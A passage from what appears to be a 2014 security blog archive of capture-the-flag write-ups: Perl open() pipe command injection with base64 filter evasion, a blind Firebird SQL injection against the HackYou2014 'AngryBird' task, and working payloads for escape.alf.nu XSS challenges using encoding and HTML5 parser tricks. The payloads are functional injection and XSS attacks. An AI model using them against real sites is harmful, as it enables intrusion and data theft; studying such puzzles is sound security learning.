fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls ..|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls /|")'  
fusion@fusion:~/test$ ls  
|ls ..|  |ls .|  |pwd|
</code></pre>

<p>No backslashes neither:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo -e '\x6c\x73\x20\x2f'`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Lets try base64:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo bHMgLw== | base64 -d`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |`echo bHMgLw== | base64 -d`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Cool! lets submit it:</p>

<p><img src="../../content/images/octopress/web200-3.png" alt=""></p>

<p>And fetch our recompense:</p>

<p><img src="../../content/images/octopress/web200-4.png" alt=""></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/15/hackyou2014-web200-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-web tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-15">15 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/web/">Web</a>, <a href="../../tag/php/">PHP</a>, <a href="../../tag/hackyou201458/">HackYou2014</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/15/hackyou2014-web300-write-up/">#hackyou2014 Web300 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="index.html">level</a> we were presented with an online shop:</p>

<p><img src="../../content/images/octopress/web300-1.png" alt=""></p>

<p>The task name was "AngryBird" and this was very relevant to solve the challange! It actually comes down to two parts:</p>

<ul>
<li>Finding a hidden admin area</li>
<li>Exploiting a blind SQLi to get credentials</li>
</ul>

<h2 id="findingthehiddenadminarea">Finding the hidden admin area</h2>

<p>We were given the following description:</p>

<blockquote>
  <p>Some web-developers still host their sites on Windows platform, and think that it is secure enough</p>
</blockquote>

<p>So we have to unravel our Windows PHP trickery and one of the coolest thigs Ive seen lately is this <a href="http://onsec.ru/onsec.whitepaper-02.eng.pdf">Windows+PHP bug realted with <strong>findfirstfile</strong></a>. If you havent read the paper so far, go and read it, is awesome!.</p>

<p>Anyway, using this trick on the main page and a little bit of burp intruder, we can find interesting hidden stuff. For examplo:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=p&lt;&lt;  
</code></pre>

<p>the "p&lt;&lt;" bit will become "p*" and Windows's findfirstfile API used by include_once will return us the first file starting with "p" and it will show us <strong>phpinfo()</strong></p>

<p><img src="../../content/images/octopress/phpinfo.png" alt=""></p>

<p>Using same trick we can see that "0&lt;&lt;" returns an expty page instead of a "Page does not exists", so it can be the beggining of a directory name. After bruteforcing it we find a secret admin login in</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/0a5d2eb35b90e338ed481893af7a6d78/index.php  
</code></pre>

<p>Now we need the credentials.</p>

<h2 id="exploitingtheangrybird">Exploiting the Angry Bird</h2>

<p>Its easy to find that the order parameter is vulnerable to SQL injection:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost  
</code></pre>

<p>We cannot actually uses single quotes or many other characters because of the WAF, but we can easily prove it with the following URLs:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost ASC  
</code></pre>

<p><img src="../../content/images/octopress/web300-2.png" alt=""></p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost DESC  
</code></pre>

<p><img src="../../content/images/octopress/web300-3.png" alt=""></p>

<p>We can use a similar approach to the one explained <a href="http://www.tuxz.net/blog/archives/2010/11/21/sql_injection__exploiting_the_order_by_clause/">here</a> but if we try similar queries we get errors. <br>
So the DB backend doesnt look like MySQL nor MSSQLServer ... but what the hell can be. Well, actually the task name was quite inspiring: Firebird.</p>

<p>After setting up a local instance and learning the basics of firebird syntax and how the WAF works (substring is not allowed), we come with some valid queries like:</p>

<pre><code class="language-lang-bash line-numbers ">(case when (select ascii_val(reverse(left(list(rdb$relation_name),{1}))) from rdb$relations) = 82 then name end)
</code></pre>

<p>Using a basic python script we brute force it and find the following user tables: USERS and ITEMS</p>

<p>Using similar script we can extract all the users and passwords and so we get: admin/9shS3FAk <br>
If we try those credentials in the admin page, we get the flag:</p>

<blockquote>
  <p>CTF{7aac9050378b1c41e4ba5ce48a2f6642}</p>
</blockquote>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/15/hackyou2014-web300-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-xss tag-javascript">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-08">08 Jan 2014</time> on <a href="../../tag/xss/">XSS</a>, <a href="../../tag/javascript/">JavaScript</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/">escape.alf.nu XSS Challenges Write-ups (Part 2)</a></h1>
    </header>
    <section class="post-content">
        <p>These are my solutions to <a href="https://twitter.com/steike">Erling Ellingsen</a> <a href="http://escape.alf.nu">escape.alf.nu XSS challenges</a>. I found them very interesting and I learnt a lot from them (especially from the last ones published in this post). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.</p>

<p>My suggestion, if you havent done it so far, is to go and try to solve them by yourselves.... so come on, dont be lazy, stop reading here and give them a try</p>

<p>...</p>

<p>...</p>

<p>...</p>

<p>...</p>

<p>...</p>

<p>Ok so if you have already solve them or need some hints, here are my solutions</p>

<h1 id="level9">Level 9:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  // This is sort of a spoiler for the last level :-)

  if (/[\\&lt;&gt;]/.test(s)) return '-';

  return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';
}
</code></pre>

<p>Some as level 8 but now we cannot use angle brackets (&lt;&gt;) nor backslashes (\)</p>

<p>Solutions:</p>

<p>Is it possible to use an online non-alphanumeric encoder to encode the following payload so it uses no alpha characters, angle brackets (&lt;&gt;) nor backslashes (\)</p>

<pre><code class="language-lang-javascript line-numbers ">"+alert(1))//
</code></pre>

<p>Producing a huge solution (5627):</p>

<pre><code class="language-lang-javascript line-numbers ">"+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+(+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))())//
</code></pre>

<p>We can also try to use our own minimization using the letters in "false", "true", "undefined" and "object":</p>

<table style="border: 1px solid black;">  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+!1</td><td style="border: 1px solid black;padding:15px;">false</td></tr>  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+!0</td><td style="border: 1px solid black;padding:15px;">true</td></tr>  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+{}[0]</td><td style="border: 1px solid black;padding:15px;">undefined</td></tr>  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+{}</td><td style="border: 1px solid black;padding:15px;">[object Object]</td></tr>  
</table>  

<p><br></p>

<p>Strings we will need:</p>

<table style="border: 1px solid black;">  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">sort</td><td style="border: 1px solid black;padding:15px;">[(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]]</td></tr>  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">constructor</td><td style="border: 1px solid black;padding:15px;">[(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]</td></tr>  
<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">alert(1)</td><td style="border: 1px solid black;padding:15px;">(''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"(1)"</td></tr>  
</table>  

<p><br></p>

<p>We will replace the call to <strong>alert(1)</strong> in our payload:</p>

<pre><code class="language-lang-javascript line-numbers ">"+alert(1))//
</code></pre>

<p>with the following one so we can simplify the encoding to encode strings.</p>

<pre><code class="language-lang-javascript line-numbers ">"+[]["sort"]["constructor"]("alert(1)")()//
</code></pre>

<p>Note: Many other alternatives are possible like:</p>

<pre><code class="language-lang-javascript line-numbers ">"+(0)['constructor']['constructor']("alert(1)")()//
</code></pre>

<p>But I found the "sort" one to be the shortest (with other 4 letter functions like "trim")</p>

<p>This is a 246 characters solution:</p>

<pre><code class="language-lang-javascript line-numbers ">"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"(1)")())//
</code></pre>

<p>We can improve it by defining a variable containing all our letters and then just referencing it:</p>

<pre><code class="language-lang-javascript line-numbers ">_=''+!1+!0+{}[0]+{} = "falsetrueundefined[object Object]"  
</code></pre>

<pre><code class="language-lang-javascript line-numbers ">");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//
</code></pre>

<p>Now the solution is 144 characters which is still far from the winners:</p>

<p>Next iteratation is to change the base payload for something sorter like <strong>window.alert(1)</strong> <br>
In chrome, we can leak a reference to window with:</p>

<pre><code class="language-lang-javascript line-numbers ">(0,[]["concat"])()[0]
</code></pre>

<p>So using the same strings as above we get the following 100 characters solution:</p>

<pre><code class="language-lang-javascript line-numbers ">");_=""+!1+!0+{}[0]+{};(0,[][_[23]+_[19]+_[10]+_[23]+_[1]+_[5]])()[0][_[1]+_[2]+_[4]+_[6]+_[5]](1)//
</code></pre>

<p>We are still taking too many chars for defining our alphabet. Here is where <a href="https://twitter.com/0x6D6172696F">Mario</a> surprised me once again with this tweet:</p>

<p><img src="../../content/images/octopress/mariosolution.png" alt=""></p>

<pre><code class="language-lang-javascript line-numbers ">");(_=!1+URL+!0,[][_[8]+_[11]+_[7]+_[8]+_[1]+_[9]])()[0][_[1]+_[2]+_[4]+_[38]+_[9]](1)//
</code></pre>

<p>Note that he is using <strong>!1+URL+!0</strong> as the alphabet string and it difers for different browsers:</p>

<p>Firefox:  </p>

<pre><code class="language-lang-javascript line-numbers ">_=!1+URL+!0="falsefunction URL() {  
    [native code]
}true"
</code></pre>

<p>Chrome:  </p>

<pre><code class="language-lang-javascript line-numbers ">_=!1+URL+!0="falsefunction URL() { [native code] }true"  
</code></pre>

<p>Other interesting <a href="https://twitter.com/0x6D6172696F">Mario</a> 's finding is that inside with-statements, almost everything leaks [object Window] for example:</p>

<pre><code class="language-lang-javascript line-numbers ">with(0) x=[].sort,x()  
</code></pre>

<p><img src="../../content/images/octopress/windowleak.png" alt=""></p>

<h1 id="level10">Level 10:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '&amp;': '&amp;amp;', '"': '&amp;quot;', "'": '&amp;#39;' }[x] || x;
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g,
        function(_, n) {
           return htmlEscape(args[n]);
         });
  }

  return expandTemplate(
    "                                                \n\
      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\
      &lt;script&gt;                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '&lt;a href=#&gt;{name}&lt;/a&gt;';       \n\
      &lt;\/script&gt;                                     \n\
    ",
    { name : s }
  );
}
</code></pre>

<p>Injection takes place in a JS string context and since "\" is not escaped in the htmlEscape function, we can use hex or octal encoding for the "&lt;" symbol and bypass the escaping function.</p>

<p>Valid solutions:  </p>

<pre><code class="language-lang-javascript line-numbers ">\x3csvg onload=alert(1)
</code></pre>

<pre><code class="language-lang-javascript line-numbers ">\74svg onload=alert(1)
</code></pre>

<h1 id="level11"> Level 11:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  // Spoiler for level 2
  s = JSON.stringify(s).replace(/&lt;\/script/gi, '');

  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
}
</code></pre>

<p>I've seen similar escaping functions in real applications, normally it is not a good idea to fix the input data, you either accept it or reject it but trying to fix it normally leads to bypasses. In this case the escape function replaces "&lt;/script" with an empty string so shortest solution is:</p>

<pre><code class="language-lang-javascript line-numbers ">&lt;/&lt;/scriptscript&gt;&lt;script&gt;alert(1)//  
</code></pre>

<h1 id="level12">Level 12:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";
}
</code></pre>

<p>Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:</p>

<p>Solution:  </p>

<pre><code class="language-lang-javascript line-numbers ">'#';alert(1)&lt;!--  
</code></pre>

<p>It will render:  </p>

<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;'({"userdata":"';alert(1)&lt;!--"})&lt;/script&gt;  
</code></pre>

<h1 id="level13">Level 13:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // http://print.alf.nu/?text=... just outputs whatever you pass in.
  //
  // Alerting from print.alf.nu won't count; try to trigger the one below.

  s = '&lt;script&gt;' + s + '&lt;\/script&gt;';
  tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.onload = function() {
    if (youWon) alert(1);
  };
  document.body.appendChild(tag);
}
</code></pre>

<p>Iframes have a interesting feature: setting the <strong>name</strong> attribute on an iframe sets the <strong>name</strong> property of the iframe's global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own <strong>window.name</strong> and the new name will be injected in the parent's global window object if it does not exist already (it cannot overwrite it). <br>
So if we fool the framed site to declare its window.name as "youWon", a <strong>youWon</strong> variable will be setted in the parent global window object and so the "alert(1)" will be popped</p>

<p>Solution:  </p>

<pre><code class="language-lang-javascript line-numbers ">name='youWon'  
</code></pre>

<h1 id="level14">Level 14:</h1>

<pre><code class="language-lang-javascript line-numbers ">&lt;!DOCTYPE HTML&gt;  
function escape(s) {  
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[&lt;&gt;"&amp;]/g, function(s) {
                        return '&amp;#' + s.charCodeAt(0) + ';'; }); }

  return (
    '&lt;script&gt;' +
      'var url = ' + json(s) + '; // We\'ll use this later ' + '&lt;/script&gt;\n\n' +
    '  &lt;!-- for debugging --&gt;\n' +
    '  URL: ' + html(s) + '\n\n' +
    '&lt;!-- then suddenly --&gt;\n' +
    '&lt;script&gt;\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '&lt;/script&gt;'
  );
}
</code></pre>

<p>In order to solve this level we need to be familiar with an HTML5 parser "feature" when dealing with comments in JS blocks. This feature is well described in this <a href="https://communities.coverity.com/blogs/security/2012/11/16/did-i-do-that-html-5-js-escapers-3">post</a> (thanks for the hint <a href="https://twitter.com/cgvwzq">@cgvwzq</a>!).</p>

<p>The trick is that injecting an <a href="http://javascript.spec.whatwg.org/#comment-syntax">HTML5 single line comment</a> "&lt;!--" followed by a "&lt;script&gt;" open tag will move the parser into the "script data double escaped state" until the closing script tag is found and then it will transition into "<strong>script data escaped state</strong>" and it will treat anything from the end of the string where we injected the "&lt;!--&lt;script&gt;" as JS! only thing we need to do is making sure there is a "--&gt;" so that the parser does not throw an invalid syntax exception.</p>

<p>So basically, if there is a "--&gt;" somewhere in the code (or we can inject it) we can fool the parser into processing HTML as JS. The string where we inject "&lt;!--&lt;script&gt;" will still be considered as a JS string an everything following the string will become JS.</p>

<p>For this level we will make the JS engine to parse the HTML part (URL: xxx). In order to do so, we will start our payload with "alert(1)" so that the first JS evaluated will be "URL: alert(1)" then we want to comment out the remaining JS code so we will insert a multi-line comment start "/<em>". This way everything else will be commented out until we reach the "</em>/" present in the regexp; the code from that point on will be evaluated. In order to get a valid regexp we will also inject "if(/a/" before the multi-line comment start. So our payload will look like:</p>

<pre><code class="language-lang-javascript line-numbers ">alert(1);/*&lt;!--&lt;script&gt;*/if(/a//*  
</code></pre>

<p>The resulting code will be:</p>

<p><img src="../../content/images/octopress/xsslevel14.png" alt=""></p>

<p>Now if we clean it up and remove the comments (in grey):</p>

<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;  
  var url = "alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*";
  URL: alert(1); if(/a/.test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
&lt;/script&gt;  
</code></pre>

<p>We can get it even shorter with:</p>

<pre><code class="language-lang-javascript line-numbers ">if(alert(1)/*&lt;!--&lt;script&gt;  
</code></pre>

<p>This will turn into:</p>

<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;  
  var url = "alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*";
  URL: if(alert(1).test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
&lt;/script&gt;  
</code></pre>

<h1 id="level15">Level 15:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
  return s.split('#').map(function(v) {
      // Only 20% of slashes are end tags; save 1.2% of total
      // bytes by only escaping those.
      var json = JSON.stringify(v).replace(/&lt;\//g, '&lt;\\/');
      return '&lt;script&gt;console.log('+json+')&lt;/script&gt;';
      }).join('');
}
</code></pre>

<p>We can use the same trick we used for level 14. We can start with something simple like:</p>

<pre><code class="language-lang-javascript line-numbers ">payload1#payload2  
</code></pre>

<p>that will render:</p>

<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;console.log("payload1")&lt;/script&gt;&lt;script&gt;console.log("payload2")&lt;/script&gt;  
</code></pre>

<p>We can take advantage of HTML5 "&lt;!--&lt;script&gt;" trick to change the way the parser treats the code between the two blocks and inject our "alert(1)" payload. <br>
Note that this trick only works in HTML5 documents and we will need to inject a closing "--&gt;" since it is not present in the code</p>

<p>The solution is:</p>

<pre><code class="language-lang-javascript line-numbers ">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;  
</code></pre>

<p>This will render:</p>

<p><img src="../../content/images/octopress/xsslevel15-1.png" alt=""></p>

<p>Since we transition to "<strong>script data double escaped state</strong>" when the parser finds "&lt;!--&lt;script&gt;", the JS engine will receive the following valid JS expression:</p>

<p><img src="../../content/images/octopress/xsslevel15-2.png" alt=""></p>

<p>That can be interpreted as:</p>

<pre><code class="language-lang-javascript line-numbers ">console.log("junk_string") &lt; /junk_regexp/ ; alert(1) // --&gt;  
</code></pre>

<p>Where:</p>

<ul>
<li>junk_string: &lt;!--&lt;script&gt;</li>
<li>junk_regexp: script&gt;&lt;script&gt;console.log(")</li>
</ul>

<p>Actually you can see in the console that the first console.log writes '&lt;!--&lt;script&gt;'</p>

<p>In order to make it even shorter we can replace "//" with unicode \u2028 as suggested by <a href="https://twitter.com/0x6D6172696F">Mario</a></p>

<h1 id="level16">Level 16:</h1>

<pre><code class="language-lang-javascript line-numbers ">function escape(text) {  
  // *cough* not done

  var i = 0;
  window.the_easy_but_expensive_way_out = function() { alert(i++) };

// "A JSON text can be safely passed into JavaScript's eval() function
// (which compiles and executes a string) if all the characters not
// enclosed in strings are in the set of characters that form JSON
// tokens."

  if (!(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(
